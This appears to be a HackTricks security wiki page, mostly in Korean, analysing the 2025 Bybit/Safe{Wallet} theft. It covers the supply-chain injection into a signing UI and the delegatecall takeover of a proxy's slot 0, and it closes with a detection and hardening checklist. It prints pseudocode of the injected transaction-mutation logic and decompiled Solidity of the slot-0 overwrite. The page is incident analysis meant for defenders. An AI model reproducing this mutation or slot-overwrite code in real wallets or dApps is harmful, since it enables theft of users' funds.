# Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## 개요

cold-wallet theft chain은 **Safe{Wallet} 웹 UI의 supply-chain compromise**와 **proxy의 implementation pointer(slot 0)를 덮어쓰는 on-chain delegatecall primitive**를 결합했습니다. 핵심 내용은 다음과 같습니다.

- dApp이 signing path에 code를 주입할 수 있다면, 다른 signer들이 이를 인지하지 못하도록 원래 UI 데이터를 복원하면서 signer가 attacker가 선택한 필드에 대한 유효한 **EIP-712 signature**를 생성하도록 만들 수 있습니다.
- Safe proxy는 `masterCopy`(implementation)를 **storage slot 0**에 저장합니다. slot 0에 쓰기를 수행하는 contract에 delegatecall하면 Safe가 사실상 attacker logic으로 “upgrade”되어 wallet을 완전히 제어할 수 있습니다.

## Off-chain: Safe{Wallet}에서의 대상 지정 signing mutation

변조된 Safe bundle(`_app-*.js`)은 특정 Safe + signer address만 선택적으로 공격했습니다. 주입된 logic은 signing call 직전에 실행되었습니다:<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Attack properties
- **Context-gated**: victim Safe/signer에 대한 hard-coded allowlist를 사용해 noise를 방지하고 detection 가능성을 낮췄다.<sup>[[1]](#references)[[3]](#references)</sup>
- **Last-moment mutation**: `signTransaction` 직전에 fields (`to`, `data`, `operation`, gas)를 덮어쓴 다음 되돌렸기 때문에, UI의 proposal payload는 benign하게 보이는 동안 signatures는 attacker payload와 일치했다.
- **EIP-712 opacity**: wallets는 structured data를 표시했지만 nested calldata를 decode하거나 `operation = delegatecall`을 강조하지 않아, mutated message는 사실상 blind-signed되었다.

### Gateway validation relevance
Safe proposals는 **Safe Client Gateway**로 제출된다. Hardened checks가 적용되기 전에는 UI가 signing 후 이를 다시 작성할 경우, JSON body의 fields와 다른 `safeTxHash`/signature에 해당하는 proposal을 gateway가 받아들일 수 있었다. Incident 이후 gateway는 hash/signature가 submitted transaction과 일치하지 않는 proposals를 거부한다. 유사한 server-side hash verification은 모든 signing-orchestration API에서도 강제되어야 한다.

### 2025 Bybit/Safe incident highlights
- 2025년 2월 21일 Bybit cold-wallet drain 사건(약 401k ETH)은 동일한 pattern을 재사용했다. Compromised Safe S3 bundle은 Bybit signers에 대해서만 trigger되었고 `operation=0` → `1`로 바꾸었으며, `to`를 slot 0에 쓰는 pre-deployed attacker contract로 지정했다.<sup>[[1]](#references)[[3]](#references)</sup>
- Wayback-cached `_app-52c9031bfa03da47.js`에는 Bybit의 Safe(`0x1db9…cf4`)와 signer addresses를 기준으로 logic을 실행한 뒤, execution 2분 후 clean bundle로 즉시 rollback하는 동작이 나타난다. 이는 “mutate → sign → restore” trick을 그대로 반영한다.<sup>[[1]](#references)[[2]](#references)</sup>
- Malicious contract(예: `0x9622…c7242`)에는 단순한 `sweepETH/sweepERC20` functions와 implementation slot에 값을 쓰는 `transfer(address,uint256)`가 포함되어 있었다. `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))`를 실행하면 proxy implementation이 변경되고 full control이 부여되었다.<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: Delegatecall proxy takeover via slot collision

Safe proxies는 **storage slot 0**에 `masterCopy`를 유지하고 모든 logic을 여기에 delegate한다. Safe는 **`operation = 1` (delegatecall)**을 지원하므로, 서명된 모든 transaction은 arbitrary contract를 지정하고 proxy의 storage context에서 해당 contract의 code를 실행할 수 있다.<sup>[[3]](#references)</sup>

Attacker contract는 ERC-20 `transfer(address,uint256)`를 모방했지만, 대신 `_to`를 slot 0에 썼다:<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Execution path:<sup>[[1]](#references)[[3]](#references)</sup>
1. 피해자는 `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`으로 `execTransaction`에 서명합니다.
2. Safe masterCopy는 이러한 매개변수에 대한 서명을 검증합니다.
3. Proxy가 `attackerContract`로 delegatecall을 수행하고, `transfer` 본문이 slot 0에 기록합니다.
4. 이제 slot 0(`masterCopy`)이 공격자가 제어하는 로직을 가리키므로 → **지갑 전체 탈취 및 자금 drain**이 발생합니다.

### Guard 및 버전 참고 사항(사고 후 hardening)
- Safes >= v1.3.0은 **Guard**를 설치하여 `delegatecall`을 거부하거나 `to`/selectors에 ACL을 적용할 수 있습니다. Bybit은 v1.1.1을 사용했으므로 Guard hook이 존재하지 않았습니다. 이 제어 plane을 확보하려면 contract를 업그레이드하고 owner를 다시 추가해야 합니다.

## Detection 및 hardening checklist

- **UI 무결성**: JS assets / SRI를 pin하고, bundle diff를 모니터링하며, signing UI를 trust boundary의 일부로 취급합니다.
- **Sign-time validation**: **EIP-712 clear-signing**을 지원하는 hardware wallet을 사용하고, `operation`을 명시적으로 표시하며 중첩된 calldata를 decode합니다. `operation = 1`일 때 policy가 허용하지 않으면 서명을 거부합니다.
- **Server-side hash checks**: proposal을 relay하는 gateway/service는 `safeTxHash`를 다시 계산하고, 서명이 제출된 field와 일치하는지 검증해야 합니다.
- **Policy/allowlists**: `to`, selectors, asset types에 대한 preflight rule을 적용하고, 검증된 flow를 제외한 delegatecall을 금지합니다. 완전히 서명된 transaction을 broadcast하기 전에 내부 policy service를 거치도록 요구합니다.
- **Contract design**: 엄격히 필요한 경우가 아니라면 multisig/treasury wallet에서 임의의 delegatecall을 노출하지 않습니다. upgrade pointer를 slot 0에서 떨어진 위치에 두거나, 명시적인 upgrade logic 및 access control로 보호합니다.
- **Monitoring**: treasury fund를 보유한 wallet에서 delegatecall이 실행되는 경우와, 일반적인 `call` pattern에서 `operation`을 변경하는 proposal을 alert합니다.

## References

- [1] [AnChain.AI forensic breakdown of the Bybit Safe exploit](https://www.anchain.ai/blog/bybit)
- [2] [Zero Hour Technology analysis of the Safe bundle compromise](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
